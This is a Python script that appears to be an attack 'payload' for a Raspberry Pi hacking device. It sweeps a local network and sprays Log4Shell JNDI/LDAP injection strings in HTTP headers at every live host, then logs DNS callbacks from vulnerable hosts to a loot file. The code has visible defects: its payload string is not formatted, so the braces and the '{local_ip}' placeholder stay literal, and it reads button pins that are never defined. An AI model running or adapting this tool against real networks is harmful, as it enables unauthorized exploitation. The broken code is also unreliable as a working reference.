#!/usr/bin/env python3
"""
KTOx *payload* – **Log4Shell Scanner**
=========================================
This payload scans for Log4Shell (CVE-2021-44228) vulnerabilities in network
hosts. It works by sending specially crafted HTTP requests with a JNDI payload
in various headers (User-Agent, X-Api-Version, Referer) and then listening
for DNS callbacks. If a DNS query is received from a target host, it indicates
potential vulnerability.

Features:
- Scans local network for live hosts.
- Sends HTTP requests with Log4Shell payloads to common web ports.
- Sets up a local DNS listener to detect callbacks from vulnerable hosts.
- Displays scan status and lists vulnerable hosts on the LCD.
- Allows selection of network interface for scanning.
- Allows editing of web ports to scan.
- Saves a list of vulnerable hosts to a loot file.
- Graceful exit via KEY3 or Ctrl-C.

Controls:
- MAIN SCREEN:
    - OK: Start/Re-run scan.
    - KEY1: Edit web ports to scan.
    - KEY3: Exit Payload.
- PORTS INPUT SCREEN:
    - UP/DOWN: Change character at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm ports.
    - KEY3: Cancel input.
- INTERFACE SELECTION SCREEN:
    - UP/DOWN: Navigate interfaces.
    - OK: Select interface.
    - KEY3: Cancel selection.
"""
import sys
import os
import time
import signal
import subprocess
import threading
import socket
import requests
from queue import Queue
# Prefer /root/KTOx for imports; fallback to repo-relative
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(__file__, '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)
# Also add wifi subdir if present
_wifi_dir = os.path.join(KTOX_ROOT, 'wifi')
if os.path.isdir(_wifi_dir) and _wifi_dir not in sys.path:
    sys.path.insert(0, _wifi_dir)
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from scapy.all import *
conf.verb = 0
def get_available_interfaces():
    try:
        import re as _re, subprocess as _sub
        out = _sub.run(['iw', 'dev'], capture_output=True, text=True, timeout=5).stdout
        return _re.findall(r'Interface (\S+)', out)
    except Exception:
        return []

def set_ktox_interface(iface):
    pass

try:
    from wifi.wifi_manager import WiFiManager
except Exception:
    class WiFiManager:
        def __init__(self): pass
        def get_interface(self): return 'wlan0'
        def get_available_interfaces(self): return get_available_interfaces()
        def connect(self, *a, **kw): return False
        def disconnect(self, *a, **kw): return False

PINS: dict[str, int] = { "OK": 13, "KEY3": 16, "KEY1": 21, "UP": 6, "DOWN": 19 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)

LOOT_DIR = os.path.join(KTOX_ROOT, "loot", "Log4Shell")
WEB_PORTS = [80, 8080, 443, 8443]
running = True
ui_lock = threading.Lock()
vulnerable_hosts = []
scan_status = "Starting..."
current_ports_input = ", ".join(map(str, WEB_PORTS))
ports_input_cursor_pos = 0
wifi_manager = WiFiManager()

def cleanup(*_):
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def show_message(lines, color="lime"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    font = FONT_TITLE
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (128 - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui(screen_state="main"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Log4Shell Scanner", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)

    if screen_state == "main":
        with ui_lock:
            d.text((5, 25), f"Status: {scan_status}", font=FONT, fill="yellow")
            
            d.text((5, 40), "Vulnerable Hosts:", font=FONT, fill="orange")
            y_pos = 50
            for host in vulnerable_hosts[-5:]:
                d.text((8, y_pos), host, font=FONT, fill="white")
                y_pos += 10

        d.text((5, 115), "OK=Scan | KEY1=Edit Ports | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "ports_input":
        d.text((5, 30), "Enter Web Ports (CSV):", font=FONT, fill="white")
        display_ports = list(current_ports_input)
        if ports_input_cursor_pos < len(display_ports):
            display_ports[ports_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ports[:16]), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_text_input_logic(initial_text, screen_state_name, char_set):
    global current_ports_input, ports_input_cursor_pos
    
    current_input_ref = current_ports_input
    cursor_pos_ref = ports_input_cursor_pos

    current_input_ref = initial_text
    cursor_pos_ref = len(initial_text) - 1
    
    draw_ui(screen_state_name)
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            if current_input_ref:
                return current_input_ref
            else:
                show_message(["Input cannot", "be empty!"])
                time.sleep(2)
                current_input_ref = initial_text
                cursor_pos_ref = len(initial_text) - 1
                draw_ui(screen_state_name)
        
        if btn == "LEFT":
            cursor_pos_ref = max(0, cursor_pos_ref - 1)
            draw_ui(screen_state_name)
        elif btn == "RIGHT":
            cursor_pos_ref = min(len(current_input_ref), cursor_pos_ref + 1)
            draw_ui(screen_state_name)
        elif btn == "UP" or btn == "DOWN":
            if cursor_pos_ref < len(current_input_ref):
                char_list = list(current_input_ref)
                current_char = char_list[cursor_pos_ref]
                
                try:
                    char_index = char_set.index(current_char)
                    if btn == "UP":
                        char_index = (char_index + 1) % len(char_set)
                    else:
                        char_index = (char_index - 1 + len(char_set)) % len(char_set)
                    char_list[cursor_pos_ref] = char_set[char_index]
                    current_input_ref = "".join(char_list)
                except ValueError:
                    char_list[cursor_pos_ref] = char_set[0]
                    current_input_ref = "".join(char_list)
                draw_ui(screen_state_name)
        
        time.sleep(0.1)
    return None

def draw_ui_interface_selection(interfaces, current_selection):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Select Interface", font=FONT_TITLE, fill="cyan")
    d.line([(0, 22), (128, 22)], fill="cyan", width=1)

    y_pos = 25
    for i, iface in enumerate(interfaces):
        color = "yellow" if i == current_selection else "white"
        d.text((5, y_pos), iface, font=FONT, fill=color)
        y_pos += 11
    
    d.text((5, 115), "UP/DOWN=Select | OK=Confirm", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def select_interface_menu():
    global scan_status
    
    available_interfaces = get_available_interfaces()
    if not available_interfaces:
        show_message(["No network", "interfaces found!"])
        time.sleep(3)
        return None

    current_menu_selection = 0
    while running:
        draw_ui_interface_selection(available_interfaces, current_menu_selection)
        
        if GPIO.input(PINS["KEY3"]) == 0:
            return None
        
        if GPIO.input(PINS["UP"]) == 0:
            current_menu_selection = (current_menu_selection - 1 + len(available_interfaces)) % len(available_interfaces)
            time.sleep(0.2)
        elif GPIO.input(PINS["DOWN"]) == 0:
            current_menu_selection = (current_menu_selection + 1) % len(available_interfaces)
            time.sleep(0.2)
        elif GPIO.input(PINS["OK"]) == 0:
            selected_iface = available_interfaces[current_menu_selection]
            show_message([f"Selected:", f"{selected_iface}"])
            time.sleep(1)
            return selected_iface
        
        time.sleep(0.1)

def get_local_ip(interface="eth0"):
    try:
        return get_if_addr(interface)
    except Scapy_Exception:
        return None

def dns_listener(local_ip, interface):
    global scan_status
    
    def handle_dns_packet(pkt):
        global scan_status
        if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
            qname = pkt[DNSQR].qname.decode()
            if local_ip in qname:
                victim_ip = pkt[IP].src
                if victim_ip not in vulnerable_hosts:
                    with ui_lock:
                        scan_status = f"VULNERABLE: {victim_ip}"
                        vulnerable_hosts.append(victim_ip)
                        save_loot()

    sniff(iface=interface, filter=f"udp port 53 and dst host {local_ip}", prn=handle_dns_packet, stop_filter=lambda p: not running)

def save_loot():
    os.makedirs(LOOT_DIR, exist_ok=True)
    loot_file = os.path.join(LOOT_DIR, "vulnerable_hosts.txt")
    with open(loot_file, "w") as f:
        f.writelines([f"{host}\n" for host in vulnerable_hosts])

def run_scan(interface):
    global scan_status, vulnerable_hosts
    vulnerable_hosts = []
    
    local_ip = get_local_ip(interface)
    if not local_ip:
        with ui_lock: scan_status = f"{interface} has no IP!"
        return

    threading.Thread(target=dns_listener, args=(local_ip, interface,), daemon=True).start()
    
    with ui_lock: scan_status = "Discovering hosts..."
    network_range = None
    try:
        network_range = subprocess.check_output(f"ip -o -4 addr show {interface} | awk '{{print $4}}'", shell=True).decode().strip()
    except subprocess.CalledProcessError:
        pass
    
    if not network_range:
        network_range = f"{local_ip}/24"
        
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_range), timeout=5, iface=interface, verbose=0)
    live_hosts = [received.psrc for sent, received in ans]
    
    payload = "${{jndi:ldap://${{hostName}}.{local_ip}.ktox.local/a}}"
    headers = { "User-Agent": payload, "X-Api-Version": payload, "Referer": payload }

    for host in live_hosts:
        if not running: break
        with ui_lock: scan_status = f"Scanning {host}..."
        
        for port in WEB_PORTS:
            if not running: break
            protocol = "https" if port in [443, 8443] else "http"
            url = f"{protocol}://{host}:{port}"
            
            try:
                requests.get(url, headers=headers, timeout=2, verify=False)
            except requests.exceptions.RequestException:
                pass

    with ui_lock:
        if running:
            scan_status = "Scan finished."

if __name__ == "__main__":
    current_screen = "main"
    try:
        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds
    
        selected_interface = select_interface_menu()
        if not selected_interface:
            show_message(["No interface", "selected!", "Exiting..."])
            time.sleep(3)
            sys.exit(1)
    
        scan_thread = threading.Thread(target=run_scan, args=(selected_interface,), daemon=True)
        scan_thread.start()
    
        while running:
            current_time = time.time()
            
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    scan_thread = threading.Thread(target=run_scan, args=(selected_interface,), daemon=True)
                    scan_thread.start()
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    current_ports_input = ", ".join(map(str, WEB_PORTS))
                    current_screen = "ports_input"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "ports_input":
                char_set = "0123456789,"
                new_ports_str = handle_text_input_logic(current_ports_input, "ports_input", char_set)
                if new_ports_str:
                    try:
                        WEB_PORTS = [int(p.strip()) for p in new_ports_str.split(',') if p.strip().isdigit()]
                        if not WEB_PORTS:
                            WEB_PORTS = [80, 8080, 443, 8443]
                    except ValueError:
                        show_message(["Invalid Ports!", "Use comma-sep", "numbers."])
                        time.sleep(3)
                current_screen = "main"
                time.sleep(BUTTON_DEBOUNCE_TIME)
            
            time.sleep(0.1)
    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        show_message(["CRITICAL ERROR:", str(e)[:20]])
        time.sleep(3)
    finally:
        cleanup()
        if scan_thread and scan_thread.is_alive():
            scan_thread.join(timeout=1)
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Log4Shell Scanner payload finished.")